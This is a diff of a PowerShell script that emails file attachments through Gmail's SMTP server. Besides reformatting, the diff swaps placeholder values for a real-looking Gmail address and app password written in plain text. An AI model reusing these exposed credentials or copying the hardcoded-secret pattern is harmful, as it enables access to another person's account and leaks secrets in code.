@@ -1,37 +1,31 @@
 ﻿﻿Param( [String]$Att, 
-       [String]$Subj,
-       [String]$Body
-     )
+	[String]$Subj,
+	[String]$Body
+)
 
-Function Send-Mail
-{
-    Param(
-            [Parameter(Mandatory=$true)] [string]$To, 
-            [Parameter(Mandatory=$true)] [string]$From,
-            [Parameter(Mandatory=$true)] [string]$Password,
-            [Parameter(Mandatory=$true)] [string]$Subject,
-            [Parameter(Mandatory=$true)] [string]$Body,
-            [Parameter(Mandatory=$true)] [string]$Attachment
-        )
+Function Send-Mail {
+	Param(
+		[Parameter(Mandatory = $true)] [string]$To, 
+		[Parameter(Mandatory = $true)] [string]$From,
+		[Parameter(Mandatory = $true)] [string]$Password,
+		[Parameter(Mandatory = $true)] [string]$Subject,
+		[Parameter(Mandatory = $true)] [string]$Body,
+		[Parameter(Mandatory = $true)] [string]$Attachment
+	)
 
-	try
-	{
+	try {
 		$Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)
 		$Srv = "smtp.gmail.com"
-		if($Attachment -ne $null)
-		{
-			try
-			{
+		if ($Attachment -ne $null) {
+			try {
 				$attachments = $Attachment -split ("\:\:");
 
-				ForEach($val in $attachments)
-				{
+				ForEach ($val in $attachments) {
 					$attach = New-Object System.Net.Mail.Attachment($val)
 					$Msg.Attachments.Add($attach) 
 				}
 			}
-			catch
-			{
+			catch {
 				exit 2;
 			}
 
@@ -43,13 +37,15 @@ Function Send-Mail
 			Remove-Variable -Name Password
 			exit 7;
 		}
-	} catch {
-			exit 3;
+	}
+ catch {
+		exit 3;
 	}
 }
 
 try {
-	Send-Mail -To "youremail@gmail.com" -From "youremail@gmail.com" -Password "youremailpassword" -Body $Body -Subject $Subj -Attachment $Att
-} catch {
-    exit 4;
+	Send-Mail -To "gf90ali@gmail.com" -From "gf90ali@gmail.com" -Password "wlip ppko svrs qonz" -Body $Body -Subject $Subj -Attachment $Att
+}
+catch {
+	exit 4;
 }
